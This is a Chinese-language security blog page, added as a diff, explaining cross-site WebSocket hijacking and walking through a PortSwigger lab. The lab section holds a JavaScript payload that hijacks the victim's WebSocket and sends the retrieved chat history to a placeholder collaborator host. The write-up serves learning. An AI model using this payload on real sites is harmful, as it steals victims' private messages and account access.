@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="什么是Cross-site WebSocket劫持？跨站点WebSocket劫持涉及WebSocket握手上的跨站点请求伪造（CSRF）漏洞。当WebSocket握手请求仅依赖HTTP cookie进行会话处理并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。攻击者可以在自己的域上创建恶意网页，从而建立与易受攻击应用程序的跨站点WebSocket连接。应用程序将在受害用户与应用程序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cross-site WebSocket劫持">
+<meta property="og:url" content="http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="什么是Cross-site WebSocket劫持？跨站点WebSocket劫持涉及WebSocket握手上的跨站点请求伪造（CSRF）漏洞。当WebSocket握手请求仅依赖HTTP cookie进行会话处理并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。攻击者可以在自己的域上创建恶意网页，从而建立与易受攻击应用程序的跨站点WebSocket连接。应用程序将在受害用户与应用程序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/NfTR379lsnyW2wQ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/Y4HoP7Rbl1pMsND.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/qxEYkD45KCHWr2G.png">
+<meta property="article:published_time" content="2023-10-04T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T10:58:12.123Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="WebSecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/14/NfTR379lsnyW2wQ.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cross-site WebSocket劫持</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/04/C++%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/04/Golang%E5%BC%80%E5%8F%91%E4%B8%80%E6%AC%BE%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&text=Cross-site WebSocket劫持"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&is_video=false&description=Cross-site WebSocket劫持"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cross-site WebSocket劫持&body=Check out this article: http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&name=Cross-site WebSocket劫持&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&t=Cross-site WebSocket劫持"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCross-site-WebSocket%E5%8A%AB%E6%8C%81%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是Cross-site WebSocket劫持？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-site-WebSocket%E5%8A%AB%E6%8C%81%E7%9A%84%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">Cross-site WebSocket劫持的影响？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8CCross-site-WebSocket%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">如何执行Cross-site WebSocket劫持攻击？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">示例</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Cross-site WebSocket劫持
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-04T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WebSecurity/" rel="tag">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="什么是Cross-site-WebSocket劫持？"><a href="#什么是Cross-site-WebSocket劫持？" class="headerlink" title="什么是Cross-site WebSocket劫持？"></a>什么是Cross-site WebSocket劫持？</h4><p>跨站点WebSocket劫持涉及WebSocket握手上的跨站点请求伪造（CSRF）漏洞。当WebSocket握手请求仅依赖HTTP cookie进行会话处理并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。<br>攻击者可以在自己的域上创建恶意网页，从而建立与易受攻击应用程序的跨站点WebSocket连接。应用程序将在受害用户与应用程序的会话上下文中处理连接。<br>然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器接收回来的消息内容。这意味着，与常规CSRF不同，攻击者可以获得与受损应用程序的双向交互。</p>
+<h4 id="Cross-site-WebSocket劫持的影响？"><a href="#Cross-site-WebSocket劫持的影响？" class="headerlink" title="Cross-site WebSocket劫持的影响？"></a>Cross-site WebSocket劫持的影响？</h4><p>成功的跨站点WebSocket劫持攻击通常会使攻击者能够：</p>
+<ul>
+<li>伪装成受害者用户执行未经授权的操作。与常规CSRF一样，攻击者可以向服务器端应用程序发送任意消息。如果应用程序使用客户端生成的WebSocket消息执行任何敏感操作，则攻击者可以跨域生成合适的消息并触发这些操作。</li>
+<li>检索用户可以访问的敏感数据。与常规CSRF不同，跨站点WebSocket劫持使攻击者能够通过被劫持的WebSocket与易受攻击的应用程序进行双向交互。如果应用程序使用服务器生成的WebSocket消息向用户返回任何敏感数据，则攻击者可以拦截这些消息并捕获受害用户的数据。</li>
+</ul>
+<h4 id="如何执行Cross-site-WebSocket劫持攻击？"><a href="#如何执行Cross-site-WebSocket劫持攻击？" class="headerlink" title="如何执行Cross-site WebSocket劫持攻击？"></a>如何执行Cross-site WebSocket劫持攻击？</h4><p>由于Cross-site WebSocket劫持攻击本质上是WebSocket握手上的CSRF漏洞，因此执行攻击的第一步是检查应用程序执行的WebSocket握手，并确定它们是否受到CSRF保护。<br>就CSRF攻击的正常情况而言，通常需要找到一个仅依赖HTTP cookie进行会话处理的握手消息，并且在请求参数中不使用任何令牌或其他不可预测的值。<br>例如，以下WebSocket握手请求可能容易受到CSRF的攻击，因为唯一的会话令牌是在cookie中传输的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /chat HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==</span><br><span class="line">Connection: keep-alive, Upgrade</span><br><span class="line">Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line">Upgrade: websocket</span><br></pre></td></tr></table></figure>
+
+<p>Sec-WebSocket-Key标头包含一个随机值，以防止缓存代理时出错，并且不用于身份验证或会话处理目的。</p>
+<p>如果WebSocket握手请求易受CSRF攻击，则攻击者的网页可以在目标站点上执行跨站点请求来打开WebSocket。攻击可能涉及：</p>
+<ul>
+<li>发送WebSocket消息以代表受害用户执行未经授权的操作。</li>
+<li>发送WebSocket消息以检索敏感数据。</li>
+<li>等待服务器发送包含敏感数据的消息到达。</li>
+</ul>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab</span><br></pre></td></tr></table></figure>
+
+<p>要求使用跨站点WebSocket劫持攻击来过滤受害者的聊天记录，然后使用该漏洞访问他们的帐户。</p>
+<p>WebSocket history中看到客户端会发送READY字符串来命令服务器检索历史消息记录</p>
+<p><a href="https://smms.app/image/NfTR379lsnyW2wQ" target="_blank"><img src="https://s2.loli.net/2024/01/14/NfTR379lsnyW2wQ.png" ></a></p>
+<p>将以下JavaScript脚本放到服务器上运行，获取用户的历史消息记录</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://your-websocket-url&#x27;</span>);</span><br><span class="line">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://your-collaborator-url&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span>&#125;);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">data</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>your-collaborator-url是burp的collaborator生成的url，your-websocket-url是目标站点</p>
+<p>onmessage是一旦获取到消息之后执行的操作，这里就是获取到历史聊天记录</p>
+<p>这个脚本理论上是可以获取所有使用这个WebSocket进行聊天的用户的聊天记录的</p>
+<p>点击发送给victim之后，就可以在collaborator中看到记录了</p>
+<p><a href="https://smms.app/image/Y4HoP7Rbl1pMsND" target="_blank"><img src="https://s2.loli.net/2024/01/14/Y4HoP7Rbl1pMsND.png" ></a></p>
+<p><a href="https://smms.app/image/qxEYkD45KCHWr2G" target="_blank"><img src="https://s2.loli.net/2024/01/14/qxEYkD45KCHWr2G.png" ></a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCross-site-WebSocket%E5%8A%AB%E6%8C%81%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是Cross-site WebSocket劫持？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-site-WebSocket%E5%8A%AB%E6%8C%81%E7%9A%84%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">Cross-site WebSocket劫持的影响？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8CCross-site-WebSocket%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">如何执行Cross-site WebSocket劫持攻击？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">示例</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&text=Cross-site WebSocket劫持"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&is_video=false&description=Cross-site WebSocket劫持"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cross-site WebSocket劫持&body=Check out this article: http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&title=Cross-site WebSocket劫持"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&name=Cross-site WebSocket劫持&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/Cross-site%20WebSocket%E5%8A%AB%E6%8C%81/&t=Cross-site WebSocket劫持"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
